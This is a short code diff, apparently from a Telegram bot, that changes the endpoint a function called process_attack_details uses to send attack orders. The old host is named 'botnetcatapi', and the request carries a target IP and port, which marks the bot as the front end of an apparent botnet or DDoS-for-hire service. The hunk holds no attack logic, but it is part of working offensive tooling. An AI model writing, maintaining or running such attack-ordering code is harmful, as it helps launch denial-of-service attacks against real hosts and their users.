@@ -384,7 +384,7 @@ def process_attack_details(message):
             username = message.chat.username or "No username"
 
             # Prepare API Payload
-            api_url = "https://botnetcatapi.up.railway.app/attack"
+            api_url = "https://api-production-58d6.up.railway.app/api/v1/attack"
             payload = {
                 "ip": target,
                 "port": port,
